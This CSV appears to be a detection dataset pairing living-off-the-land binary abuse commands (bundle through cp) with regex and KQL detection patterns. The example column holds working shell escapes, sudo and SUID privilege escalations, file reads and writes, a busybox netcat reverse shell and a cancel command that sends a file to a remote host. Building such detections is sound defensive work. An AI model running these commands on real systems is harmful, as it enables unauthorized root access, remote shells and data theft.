Name,Function,ExampleCode,KeywordsExtracted,RegexFuzzyV7,RegexFuzzyV7_KQL,Notes
bundle,shell,"touch $TF/Gemfile
cd $TF
bundle exec /bin/sh",touch TF/Gemfile exec /bin/sh /Gemfile,(?i)\b(?:\S*/)?bundle.*touch.*TF/Gemfile.*exec.*/bin/sh.*/Gemfile,"@""(?i)\b(?:\S*/)?bundle.*touch.*TF/Gemfile.*exec.*/bin/sh.*/Gemfile""",
bundle,shell,"touch $TF/Gemfile
cd $TF
bundle console
system('/bin/sh -c /bin/sh')",touch TF/Gemfile console system /bin/sh /Gemfile,(?i)\b(?:\S*/)?bundle.*touch.*TF/Gemfile.*console.*system.*/bin/sh.*/Gemfile,"@""(?i)\b(?:\S*/)?bundle.*touch.*TF/Gemfile.*console.*system.*/bin/sh.*/Gemfile""",
bundle,shell,"echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundle install",echo system /bin/sh TF/Gemfile install /Gemfile,(?i)\b(?:\S*/)?bundle.*echo.*system.*/bin/sh.*TF/Gemfile.*install.*/Gemfile,"@""(?i)\b(?:\S*/)?bundle.*echo.*system.*/bin/sh.*TF/Gemfile.*install.*/Gemfile""",
bundle,sudo,"sudo bundle help
!/bin/sh",sudo help /bin/sh,(?i)\b(?:\S*/)?bundle.*sudo.*help.*/bin/sh,"@""(?i)\b(?:\S*/)?bundle.*sudo.*help.*/bin/sh""",
bundler,shell,"bundler help
!/bin/sh",help /bin/sh,(?i)\b(?:\S*/)?bundler.*help.*/bin/sh,"@""(?i)\b(?:\S*/)?bundler.*help.*/bin/sh""",
bundler,shell,bundler exec /bin/sh,exec /bin/sh,(?i)\b(?:\S*/)?bundler.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?bundler.*exec.*/bin/sh""",
bundler,shell,"touch $TF/Gemfile
cd $TF
bundler exec /bin/sh",touch TF/Gemfile exec /bin/sh /Gemfile,(?i)\b(?:\S*/)?bundler.*touch.*TF/Gemfile.*exec.*/bin/sh.*/Gemfile,"@""(?i)\b(?:\S*/)?bundler.*touch.*TF/Gemfile.*exec.*/bin/sh.*/Gemfile""",
bundler,shell,"touch $TF/Gemfile
cd $TF
bundler console
system('/bin/sh -c /bin/sh')",touch TF/Gemfile console system /bin/sh /Gemfile,(?i)\b(?:\S*/)?bundler.*touch.*TF/Gemfile.*console.*system.*/bin/sh.*/Gemfile,"@""(?i)\b(?:\S*/)?bundler.*touch.*TF/Gemfile.*console.*system.*/bin/sh.*/Gemfile""",
bundler,shell,"echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundler install",echo system /bin/sh TF/Gemfile install /Gemfile,(?i)\b(?:\S*/)?bundler.*echo.*system.*/bin/sh.*TF/Gemfile.*install.*/Gemfile,"@""(?i)\b(?:\S*/)?bundler.*echo.*system.*/bin/sh.*TF/Gemfile.*install.*/Gemfile""",
bundler,sudo,"sudo bundler help
!/bin/sh",sudo help /bin/sh,(?i)\b(?:\S*/)?bundler.*sudo.*help.*/bin/sh,"@""(?i)\b(?:\S*/)?bundler.*sudo.*help.*/bin/sh""",
busctl,shell,"busctl --show-machine
!/bin/sh","""--show-machine /bin/sh",(?i)\b(?:\S*/)?busctl.*\-\-show\-machine.*/bin/sh,"@""(?i)\b(?:\S*/)?busctl.*\-\-show\-machine.*/bin/sh""",
busctl,shell,"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel debug --address=unixexec path=/bin/sh argv1=-c argv2= /bin/sh,(?i)\b(?:\S*/)?busctl.*set\-property.*org\.freedesktop\.systemd1.*/org/freedesktop/systemd1.*org\.freedesktop\.systemd1\.Manager.*LogLevel.*debug.*\-\-addressunixexec.*path/bin/sh,"@""(?i)\b(?:\S*/)?busctl.*set\-property.*org\.freedesktop\.systemd1.*/org/freedesktop/systemd1.*org\.freedesktop\.systemd1\.Manager.*LogLevel.*debug.*\-\-addressunixexec.*path/bin/sh""",
busctl,sudo,"sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",sudo set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel debug --address=unixexec path=/bin/sh argv1=-c argv2= /bin/sh,(?i)\b(?:\S*/)?busctl.*sudo.*set\-property.*org\.freedesktop\.systemd1.*/org/freedesktop/systemd1.*org\.freedesktop\.systemd1\.Manager.*LogLevel.*debug.*\-\-addressunixexec,"@""(?i)\b(?:\S*/)?busctl.*sudo.*set\-property.*org\.freedesktop\.systemd1.*/org/freedesktop/systemd1.*org\.freedesktop\.systemd1\.Manager.*LogLevel.*debug.*\-\-addressunixexec""",
busctl,suid,"./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel debug --address=unixexec path=/bin/sh argv1=-pc argv2= /bin/sh /busctl,(?i)\b(?:\S*/)?busctl.*set\-property.*org\.freedesktop\.systemd1.*/org/freedesktop/systemd1.*org\.freedesktop\.systemd1\.Manager.*LogLevel.*debug.*\-\-addressunixexec.*path/bin/sh,"@""(?i)\b(?:\S*/)?busctl.*set\-property.*org\.freedesktop\.systemd1.*/org/freedesktop/systemd1.*org\.freedesktop\.systemd1\.Manager.*LogLevel.*debug.*\-\-addressunixexec.*path/bin/sh""",
busybox,shell,busybox sh,sh,(?i)\b(?:\S*/)?busybox.*sh,"@""(?i)\b(?:\S*/)?busybox.*sh""",
busybox,file-upload,busybox httpd -f -p $LPORT -h .,httpd,(?i)\b(?:\S*/)?busybox.*httpd,"@""(?i)\b(?:\S*/)?busybox.*httpd""",
busybox,file-write,"busybox sh -c 'echo ""DATA"" > $LFILE'",sh echo,(?i)\b(?:\S*/)?busybox.*sh.*echo,"@""(?i)\b(?:\S*/)?busybox.*sh.*echo""",
busybox,file-read,"./busybox cat ""$LFILE""",cat /busybox,(?i)\b(?:\S*/)?busybox.*cat.*/busybox,"@""(?i)\b(?:\S*/)?busybox.*cat.*/busybox""",
busybox,suid,./busybox sh,sh /busybox,(?i)\b(?:\S*/)?busybox.*sh.*/busybox,"@""(?i)\b(?:\S*/)?busybox.*sh.*/busybox""",
busybox,sudo,sudo busybox sh,sudo sh,(?i)\b(?:\S*/)?busybox.*sudo.*sh,"@""(?i)\b(?:\S*/)?busybox.*sudo.*sh""",
busybox,reverse-shell,busybox nc -e /bin/sh $RHOST $RPORT,nc /bin/sh,(?i)\b(?:\S*/)?busybox.*nc.*/bin/sh,"@""(?i)\b(?:\S*/)?busybox.*nc.*/bin/sh""",
byebug,shell,"echo 'system(""/bin/sh"")' > $TF
byebug $TF
continue",echo system /bin/sh continue,(?i)\b(?:\S*/)?byebug.*echo.*system.*/bin/sh.*continue,"@""(?i)\b(?:\S*/)?byebug.*echo.*system.*/bin/sh.*continue""",
byebug,limited-suid,"echo 'system(""/bin/sh"")' > $TF
./byebug $TF
continue",echo system /bin/sh continue /byebug,(?i)\b(?:\S*/)?byebug.*echo.*system.*/bin/sh.*continue.*/byebug,"@""(?i)\b(?:\S*/)?byebug.*echo.*system.*/bin/sh.*continue.*/byebug""",
byebug,sudo,"echo 'system(""/bin/sh"")' > $TF
sudo byebug $TF
continue",echo system /bin/sh sudo continue,(?i)\b(?:\S*/)?byebug.*echo.*system.*/bin/sh.*sudo.*continue,"@""(?i)\b(?:\S*/)?byebug.*echo.*system.*/bin/sh.*sudo.*continue""",
bzip2,file-read,bzip2 -c $LFILE | bzip2 -d,,(?i)\b(?:\S*/)?bzip2\b,"@""(?i)\b(?:\S*/)?bzip2\b""",
bzip2,suid,./bzip2 -c $LFILE | bzip2 -d,/bzip2,(?i)\b(?:\S*/)?bzip2.*/bzip2,"@""(?i)\b(?:\S*/)?bzip2.*/bzip2""",
bzip2,sudo,sudo bzip2 -c $LFILE | bzip2 -d,sudo,(?i)\b(?:\S*/)?bzip2.*sudo,"@""(?i)\b(?:\S*/)?bzip2.*sudo""",
c89,file-read,"c89 -x c -E ""$LFILE""",,(?i)\b(?:\S*/)?c89\b,"@""(?i)\b(?:\S*/)?c89\b""",
c89,file-write,c89 -xc /dev/null -o $LFILE,/dev/null,(?i)\b(?:\S*/)?c89.*/dev/null,"@""(?i)\b(?:\S*/)?c89.*/dev/null""",
c89,shell,"c89 -wrapper /bin/sh,-s .","""-wrapper /bin/sh",(?i)\b(?:\S*/)?c89.*\-wrapper.*/bin/sh,"@""(?i)\b(?:\S*/)?c89.*\-wrapper.*/bin/sh""",
c89,sudo,"sudo c89 -wrapper /bin/sh,-s .",sudo -wrapper /bin/sh,(?i)\b(?:\S*/)?c89.*sudo.*\-wrapper.*/bin/sh,"@""(?i)\b(?:\S*/)?c89.*sudo.*\-wrapper.*/bin/sh""",
c99,file-read,"c99 -x c -E ""$LFILE""",,(?i)\b(?:\S*/)?c99\b,"@""(?i)\b(?:\S*/)?c99\b""",
c99,file-write,c99 -xc /dev/null -o $LFILE,/dev/null,(?i)\b(?:\S*/)?c99.*/dev/null,"@""(?i)\b(?:\S*/)?c99.*/dev/null""",
c99,shell,"c99 -wrapper /bin/sh,-s .","""-wrapper /bin/sh",(?i)\b(?:\S*/)?c99.*\-wrapper.*/bin/sh,"@""(?i)\b(?:\S*/)?c99.*\-wrapper.*/bin/sh""",
c99,sudo,"sudo c99 -wrapper /bin/sh,-s .",sudo -wrapper /bin/sh,(?i)\b(?:\S*/)?c99.*sudo.*\-wrapper.*/bin/sh,"@""(?i)\b(?:\S*/)?c99.*sudo.*\-wrapper.*/bin/sh""",
cabal,shell,cabal exec -- /bin/sh,exec /bin/sh,(?i)\b(?:\S*/)?cabal.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?cabal.*exec.*/bin/sh""",
cabal,suid,./cabal exec -- /bin/sh -p,exec /bin/sh /cabal,(?i)\b(?:\S*/)?cabal.*exec.*/bin/sh.*/cabal,"@""(?i)\b(?:\S*/)?cabal.*exec.*/bin/sh.*/cabal""",
cabal,sudo,sudo cabal exec -- /bin/sh,sudo exec /bin/sh,(?i)\b(?:\S*/)?cabal.*sudo.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?cabal.*sudo.*exec.*/bin/sh""",
cancel,file-upload,"cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT",cat,(?i)\b(?:\S*/)?cancel.*cat,"@""(?i)\b(?:\S*/)?cancel.*cat""",
capsh,shell,capsh --,,(?i)\b(?:\S*/)?capsh\b,"@""(?i)\b(?:\S*/)?capsh\b""",
capsh,suid,./capsh --gid=0 --uid=0 --,"""--gid=0 --uid=0 /capsh",(?i)\b(?:\S*/)?capsh.*\-\-gid0.*\-\-uid0.*/capsh,"@""(?i)\b(?:\S*/)?capsh.*\-\-gid0.*\-\-uid0.*/capsh""",
capsh,sudo,sudo capsh --,sudo,(?i)\b(?:\S*/)?capsh.*sudo,"@""(?i)\b(?:\S*/)?capsh.*sudo""",
cat,file-read,"cat ""$LFILE""",,(?i)\b(?:\S*/)?cat\b,"@""(?i)\b(?:\S*/)?cat\b""",
cat,suid,"./cat ""$LFILE""",/cat,(?i)\b(?:\S*/)?cat.*/cat,"@""(?i)\b(?:\S*/)?cat.*/cat""",
cat,sudo,"sudo cat ""$LFILE""",sudo,(?i)\b(?:\S*/)?cat.*sudo,"@""(?i)\b(?:\S*/)?cat.*sudo""",
cdist,shell,cdist shell -s /bin/sh,shell /bin/sh,(?i)\b(?:\S*/)?cdist.*shell.*/bin/sh,"@""(?i)\b(?:\S*/)?cdist.*shell.*/bin/sh""",
cdist,sudo,sudo cdist shell -s /bin/sh,sudo shell /bin/sh,(?i)\b(?:\S*/)?cdist.*sudo.*shell.*/bin/sh,"@""(?i)\b(?:\S*/)?cdist.*sudo.*shell.*/bin/sh""",
certbot,shell,certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0',certonly --standalone --dry-run --agree-tos --email --logs-dir --work-dir --config-dir --pre-hook /bin/sh,(?i)\b(?:\S*/)?certbot.*certonly.*\-\-standalone.*\-\-dry\-run.*\-\-agree\-tos.*\-\-email.*\-\-logs\-dir.*\-\-work\-dir.*\-\-config\-dir,"@""(?i)\b(?:\S*/)?certbot.*certonly.*\-\-standalone.*\-\-dry\-run.*\-\-agree\-tos.*\-\-email.*\-\-logs\-dir.*\-\-work\-dir.*\-\-config\-dir""",
certbot,sudo,sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0',sudo certonly --standalone --dry-run --agree-tos --email --logs-dir --work-dir --config-dir --pre-hook /bin/sh,(?i)\b(?:\S*/)?certbot.*sudo.*certonly.*\-\-standalone.*\-\-dry\-run.*\-\-agree\-tos.*\-\-email.*\-\-logs\-dir.*\-\-work\-dir,"@""(?i)\b(?:\S*/)?certbot.*sudo.*certonly.*\-\-standalone.*\-\-dry\-run.*\-\-agree\-tos.*\-\-email.*\-\-logs\-dir.*\-\-work\-dir""",
check_by_ssh,shell,"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx",ProxyCommand /bin/sh tty tee localhost,(?i)\b(?:\S*/)?check_by_ssh.*ProxyCommand.*/bin/sh.*tty.*tee.*localhost,"@""(?i)\b(?:\S*/)?check_by_ssh.*ProxyCommand.*/bin/sh.*tty.*tee.*localhost""",
check_by_ssh,sudo,"sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx",sudo ProxyCommand /bin/sh tty tee localhost,(?i)\b(?:\S*/)?check_by_ssh.*sudo.*ProxyCommand.*/bin/sh.*tty.*tee.*localhost,"@""(?i)\b(?:\S*/)?check_by_ssh.*sudo.*ProxyCommand.*/bin/sh.*tty.*tee.*localhost""",
check_cups,file-read,check_cups --extra-opts=@$LFILE,--extra-opts=,(?i)\b(?:\S*/)?check_cups.*\-\-extra\-opts,"@""(?i)\b(?:\S*/)?check_cups.*\-\-extra\-opts""",
check_cups,sudo,sudo check_cups --extra-opts=@$LFILE,sudo --extra-opts=,(?i)\b(?:\S*/)?check_cups.*sudo.*\-\-extra\-opts,"@""(?i)\b(?:\S*/)?check_cups.*sudo.*\-\-extra\-opts""",
check_log,file-read,"check_log -F $LFILE -O $OUTPUT
cat $OUTPUT",OUTPUT cat,(?i)\b(?:\S*/)?check_log.*OUTPUT.*cat,"@""(?i)\b(?:\S*/)?check_log.*OUTPUT.*cat""",
check_log,file-write,check_log -F $INPUT -O $LFILE,INPUT,(?i)\b(?:\S*/)?check_log.*INPUT,"@""(?i)\b(?:\S*/)?check_log.*INPUT""",
check_log,sudo,sudo check_log -F $INPUT -O $LFILE,sudo INPUT,(?i)\b(?:\S*/)?check_log.*sudo.*INPUT,"@""(?i)\b(?:\S*/)?check_log.*sudo.*INPUT""",
check_memory,file-read,check_memory --extra-opts=@$LFILE,--extra-opts=,(?i)\b(?:\S*/)?check_memory.*\-\-extra\-opts,"@""(?i)\b(?:\S*/)?check_memory.*\-\-extra\-opts""",
check_memory,sudo,sudo check_memory --extra-opts=@$LFILE,sudo --extra-opts=,(?i)\b(?:\S*/)?check_memory.*sudo.*\-\-extra\-opts,"@""(?i)\b(?:\S*/)?check_memory.*sudo.*\-\-extra\-opts""",
check_raid,file-read,check_raid --extra-opts=@$LFILE,--extra-opts=,(?i)\b(?:\S*/)?check_raid.*\-\-extra\-opts,"@""(?i)\b(?:\S*/)?check_raid.*\-\-extra\-opts""",
check_raid,sudo,sudo check_raid --extra-opts=@$LFILE,sudo --extra-opts=,(?i)\b(?:\S*/)?check_raid.*sudo.*\-\-extra\-opts,"@""(?i)\b(?:\S*/)?check_raid.*sudo.*\-\-extra\-opts""",
check_ssl_cert,command,"echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT",echo tee OUTPUT chmod --curl-bin example.net cat,(?i)\b(?:\S*/)?check_ssl_cert.*echo.*tee.*OUTPUT.*chmod.*\-\-curl\-bin.*example\.net.*cat,"@""(?i)\b(?:\S*/)?check_ssl_cert.*echo.*tee.*OUTPUT.*chmod.*\-\-curl\-bin.*example\.net.*cat""",
check_ssl_cert,sudo,"echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
umask 022
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT",echo tee OUTPUT chmod umask --curl-bin example.net cat,(?i)\b(?:\S*/)?check_ssl_cert.*echo.*tee.*OUTPUT.*chmod.*umask.*\-\-curl\-bin.*example\.net.*cat,"@""(?i)\b(?:\S*/)?check_ssl_cert.*echo.*tee.*OUTPUT.*chmod.*umask.*\-\-curl\-bin.*example\.net.*cat""",
check_statusfile,file-read,check_statusfile $LFILE,,(?i)\b(?:\S*/)?check_statusfile\b,"@""(?i)\b(?:\S*/)?check_statusfile\b""",
check_statusfile,sudo,sudo check_statusfile $LFILE,sudo,(?i)\b(?:\S*/)?check_statusfile.*sudo,"@""(?i)\b(?:\S*/)?check_statusfile.*sudo""",
chmod,suid,./chmod 6777 $LFILE,/chmod,(?i)\b(?:\S*/)?chmod.*/chmod,"@""(?i)\b(?:\S*/)?chmod.*/chmod""",
chmod,sudo,sudo chmod 6777 $LFILE,sudo,(?i)\b(?:\S*/)?chmod.*sudo,"@""(?i)\b(?:\S*/)?chmod.*sudo""",
choom,shell,choom -n 0 /bin/sh,/bin/sh,(?i)\b(?:\S*/)?choom.*/bin/sh,"@""(?i)\b(?:\S*/)?choom.*/bin/sh""",
choom,suid,./choom -n 0 -- /bin/sh -p,/bin/sh /choom,(?i)\b(?:\S*/)?choom.*/bin/sh.*/choom,"@""(?i)\b(?:\S*/)?choom.*/bin/sh.*/choom""",
choom,sudo,sudo choom -n 0 /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?choom.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?choom.*sudo.*/bin/sh""",
chown,suid,./chown $(id -un):$(id -gn) $LFILE,/chown,(?i)\b(?:\S*/)?chown.*/chown,"@""(?i)\b(?:\S*/)?chown.*/chown""",
chown,sudo,sudo chown $(id -un):$(id -gn) $LFILE,sudo,(?i)\b(?:\S*/)?chown.*sudo,"@""(?i)\b(?:\S*/)?chown.*sudo""",
chroot,suid,./chroot / /bin/sh -p,/bin/sh /chroot,(?i)\b(?:\S*/)?chroot.*/bin/sh.*/chroot,"@""(?i)\b(?:\S*/)?chroot.*/bin/sh.*/chroot""",
chroot,sudo,sudo chroot /,sudo,(?i)\b(?:\S*/)?chroot.*sudo,"@""(?i)\b(?:\S*/)?chroot.*sudo""",
clamscan,file-read,"touch $TF/empty.yara
clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'",touch TF/empty.yara --no-summary sed such /empty.yara,(?i)\b(?:\S*/)?clamscan.*touch.*TF/empty\.yara.*\-\-no\-summary.*sed.*such.*/empty\.yara,"@""(?i)\b(?:\S*/)?clamscan.*touch.*TF/empty\.yara.*\-\-no\-summary.*sed.*such.*/empty\.yara""",
clamscan,suid,"touch $TF/empty.yara
./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'",touch TF/empty.yara --no-summary sed such /empty.yara /clamscan,(?i)\b(?:\S*/)?clamscan.*touch.*TF/empty\.yara.*\-\-no\-summary.*sed.*such.*/empty\.yara.*/clamscan,"@""(?i)\b(?:\S*/)?clamscan.*touch.*TF/empty\.yara.*\-\-no\-summary.*sed.*such.*/empty\.yara.*/clamscan""",
clamscan,sudo,"touch $TF/empty.yara
sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'",touch TF/empty.yara sudo --no-summary sed such /empty.yara,(?i)\b(?:\S*/)?clamscan.*touch.*TF/empty\.yara.*sudo.*\-\-no\-summary.*sed.*such.*/empty\.yara,"@""(?i)\b(?:\S*/)?clamscan.*touch.*TF/empty\.yara.*sudo.*\-\-no\-summary.*sed.*such.*/empty\.yara""",
cmp,file-read,cmp $LFILE /dev/zero -b -l,/dev/zero,(?i)\b(?:\S*/)?cmp.*/dev/zero,"@""(?i)\b(?:\S*/)?cmp.*/dev/zero""",
cmp,suid,./cmp $LFILE /dev/zero -b -l,/dev/zero /cmp,(?i)\b(?:\S*/)?cmp.*/dev/zero.*/cmp,"@""(?i)\b(?:\S*/)?cmp.*/dev/zero.*/cmp""",
cmp,sudo,sudo cmp $LFILE /dev/zero -b -l,sudo /dev/zero,(?i)\b(?:\S*/)?cmp.*sudo.*/dev/zero,"@""(?i)\b(?:\S*/)?cmp.*sudo.*/dev/zero""",
cobc,shell,"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
cobc -xFj --frelax-syntax-checks $TF/x",echo CALL SYSTEM USING /bin/sh -xFj --frelax-syntax-checks,(?i)\b(?:\S*/)?cobc.*echo.*CALL.*SYSTEM.*USING.*/bin/sh.*\-xFj.*\-\-frelax\-syntax\-checks,"@""(?i)\b(?:\S*/)?cobc.*echo.*CALL.*SYSTEM.*USING.*/bin/sh.*\-xFj.*\-\-frelax\-syntax\-checks""",
cobc,sudo,"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
sudo cobc -xFj --frelax-syntax-checks $TF/x",echo CALL SYSTEM USING /bin/sh sudo -xFj --frelax-syntax-checks,(?i)\b(?:\S*/)?cobc.*echo.*CALL.*SYSTEM.*USING.*/bin/sh.*sudo.*\-xFj.*\-\-frelax\-syntax\-checks,"@""(?i)\b(?:\S*/)?cobc.*echo.*CALL.*SYSTEM.*USING.*/bin/sh.*sudo.*\-xFj.*\-\-frelax\-syntax\-checks""",
column,file-read,column $LFILE,,(?i)\b(?:\S*/)?column\b,"@""(?i)\b(?:\S*/)?column\b""",
column,suid,./column $LFILE,/column,(?i)\b(?:\S*/)?column.*/column,"@""(?i)\b(?:\S*/)?column.*/column""",
column,sudo,sudo column $LFILE,sudo,(?i)\b(?:\S*/)?column.*sudo,"@""(?i)\b(?:\S*/)?column.*sudo""",
comm,file-read,comm $LFILE /dev/null 2>/dev/null,/dev/null,(?i)\b(?:\S*/)?comm.*/dev/null,"@""(?i)\b(?:\S*/)?comm.*/dev/null""",
comm,suid,comm $LFILE /dev/null 2>/dev/null,/dev/null,(?i)\b(?:\S*/)?comm.*/dev/null,"@""(?i)\b(?:\S*/)?comm.*/dev/null""",
comm,sudo,sudo comm $LFILE /dev/null 2>/dev/null,sudo /dev/null,(?i)\b(?:\S*/)?comm.*sudo.*/dev/null,"@""(?i)\b(?:\S*/)?comm.*sudo.*/dev/null""",
composer,shell,"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
composer --working-dir=$TF run-script x",echo scripts /bin/sh TF/composer.json --working-dir= run-script /composer.json,(?i)\b(?:\S*/)?composer.*echo.*scripts.*/bin/sh.*TF/composer\.json.*\-\-working\-dir.*run\-script.*/composer\.json,"@""(?i)\b(?:\S*/)?composer.*echo.*scripts.*/bin/sh.*TF/composer\.json.*\-\-working\-dir.*run\-script.*/composer\.json""",
composer,limited-suid,"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
./composer --working-dir=$TF run-script x",echo scripts /bin/sh TF/composer.json --working-dir= run-script /composer.json /composer,(?i)\b(?:\S*/)?composer.*echo.*scripts.*/bin/sh.*TF/composer\.json.*\-\-working\-dir.*run\-script.*/composer\.json.*/composer,"@""(?i)\b(?:\S*/)?composer.*echo.*scripts.*/bin/sh.*TF/composer\.json.*\-\-working\-dir.*run\-script.*/composer\.json.*/composer""",
composer,sudo,"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x",echo scripts /bin/sh TF/composer.json sudo --working-dir= run-script /composer.json,(?i)\b(?:\S*/)?composer.*echo.*scripts.*/bin/sh.*TF/composer\.json.*sudo.*\-\-working\-dir.*run\-script.*/composer\.json,"@""(?i)\b(?:\S*/)?composer.*echo.*scripts.*/bin/sh.*TF/composer\.json.*sudo.*\-\-working\-dir.*run\-script.*/composer\.json""",
cowsay,shell,"echo 'exec ""/bin/sh"";' >$TF
cowsay -f $TF x",echo exec /bin/sh,(?i)\b(?:\S*/)?cowsay.*echo.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?cowsay.*echo.*exec.*/bin/sh""",
cowsay,sudo,"echo 'exec ""/bin/sh"";' >$TF
sudo cowsay -f $TF x",echo exec /bin/sh sudo,(?i)\b(?:\S*/)?cowsay.*echo.*exec.*/bin/sh.*sudo,"@""(?i)\b(?:\S*/)?cowsay.*echo.*exec.*/bin/sh.*sudo""",
cowthink,shell,"echo 'exec ""/bin/sh"";' >$TF
cowthink -f $TF x",echo exec /bin/sh,(?i)\b(?:\S*/)?cowthink.*echo.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?cowthink.*echo.*exec.*/bin/sh""",
cowthink,sudo,"echo 'exec ""/bin/sh"";' >$TF
sudo cowthink -f $TF x",echo exec /bin/sh sudo,(?i)\b(?:\S*/)?cowthink.*echo.*exec.*/bin/sh.*sudo,"@""(?i)\b(?:\S*/)?cowthink.*echo.*exec.*/bin/sh.*sudo""",
cp,file-read,"cp ""$LFILE"" /dev/stdout",/dev/stdout,(?i)\b(?:\S*/)?cp.*/dev/stdout,"@""(?i)\b(?:\S*/)?cp.*/dev/stdout""",
cp,file-write,"echo ""DATA"" | cp /dev/stdin ""$LFILE""",echo /dev/stdin,(?i)\b(?:\S*/)?cp.*echo.*/dev/stdin,"@""(?i)\b(?:\S*/)?cp.*echo.*/dev/stdin""",
cp,suid,"echo ""DATA"" | ./cp /dev/stdin ""$LFILE""",echo /dev/stdin,(?i)\b(?:\S*/)?cp.*echo.*/dev/stdin,"@""(?i)\b(?:\S*/)?cp.*echo.*/dev/stdin""",
cp,suid,"echo ""DATA"" > $TF
./cp $TF $LFILE",echo,(?i)\b(?:\S*/)?cp.*echo,"@""(?i)\b(?:\S*/)?cp.*echo""",
cp,suid,"./cp --attributes-only --preserve=all ./cp ""$LFILE""","""--attributes-only --preserve=all",(?i)\b(?:\S*/)?cp.*\-\-attributes\-only.*\-\-preserveall,"@""(?i)\b(?:\S*/)?cp.*\-\-attributes\-only.*\-\-preserveall""",
cp,sudo,"echo ""DATA"" | sudo cp /dev/stdin ""$LFILE""",echo sudo /dev/stdin,(?i)\b(?:\S*/)?cp.*echo.*sudo.*/dev/stdin,"@""(?i)\b(?:\S*/)?cp.*echo.*sudo.*/dev/stdin""",
cp,sudo,"echo ""DATA"" > $TF
sudo cp $TF $LFILE",echo sudo,(?i)\b(?:\S*/)?cp.*echo.*sudo,"@""(?i)\b(?:\S*/)?cp.*echo.*sudo""",
cp,sudo,"sudo cp /bin/sh /bin/cp
sudo cp",sudo /bin/sh /bin/cp,(?i)\b(?:\S*/)?cp.*sudo.*/bin/sh.*/bin/cp,"@""(?i)\b(?:\S*/)?cp.*sudo.*/bin/sh.*/bin/cp""",
